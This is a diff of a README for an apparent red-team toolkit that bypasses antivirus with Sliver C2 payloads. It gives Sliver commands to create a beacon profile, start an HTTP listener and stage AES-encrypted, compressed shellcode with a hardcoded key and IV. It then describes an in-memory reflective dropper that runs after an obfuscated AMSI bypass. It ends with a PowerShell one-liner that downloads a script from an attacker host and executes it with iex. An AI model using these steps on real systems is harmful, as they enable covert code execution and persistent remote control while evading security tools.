@@ -1,34 +1,37 @@
 # Bypass AV with Sliver c2
-Dropper + reflective load script for bypassing AV with sliver c2
+
+Toolkit and sample VS solution to start bypassing AV with Sliver C2 payloads.
 
 Taken from [this article](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8).
 
-Compression is a huge IOC so I may change this to remove
-
 ## In Sliver
 
-Create new beacon profile
+Create new beacon profile (does not need to be HTTPS)
 
-`profiles new -b  https://192.168.1.11:443 --skip-symbols --format shellcode --arch amd64 my_profile`
+`profiles new --http http://10.10.14.225:8080 --format shellcode http1`
 
-Start listener and add SSL cert (you can fake with msf impersonate_ssl)
+Start listener
 
-`https -L 192.168.1.11 -l 443 -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key`
+`http -L 10.10.14.225 -l 8080`
 
-Stage beacon payload and create AES keys
+Stage beacon payload - compress and encrypt (optional)
 
-`stage-listener --url https://192.168.1.11:8080 --profile my_profile -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`
+`stage-listener --url http://10.10.14.225:8443 --profile http1 -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`
 
-## Dropper
+## Dropping In-Memory
 
-Shellcode dropper solution will download, decompress, decrypt shellcode and execute. Best way is to reflectively load via PowerShell as it is .NET assembly, and the dropper is not evasive at all (you need AMSI bypass).
+Shellcode dropper solution will download, decompress, decrypt shellcode and execute. Best way is to reflectively load via PowerShell as it is .NET assembly after an AMSI bypass.
 
-1. Read in solution DLL assembly. The solution MUST BE `.NET FRAMEWORK` (~4.0).
+1. Setup your AMSI bypass. 
+	- Use `AmsiTrigger` to detect flags in `am_obfs.ps1`
+	- Use `Invoke-Obfuscation` to patch these
+	- Update the download url in the bypass.
 
-`get-content -encoding byte -path .\sliverloader.dll | clip`
+2. Make any modifications to the assembly that you like
+	- Afterwards, grab the base64 blob and update `loader.ps1`
+	- `get-content -encoding byte -path .\sliverloader.dll | clip` and then CyberChef
 
-2. Convert your keys and IV to raw bytes.
+3. Convert any encryption keys or IVs to bytes and update `loader.ps1`
 
-3. Update loader script
-
-4. Use `amsiscanbuffer()` bypass for entire process unhook including CLR
+4. Execute the dropper with bypass added
+	- `(New-Object Net.WebClient).DownloadString('http://10.10.14.225:1234/am_obfs.ps1) | iex`
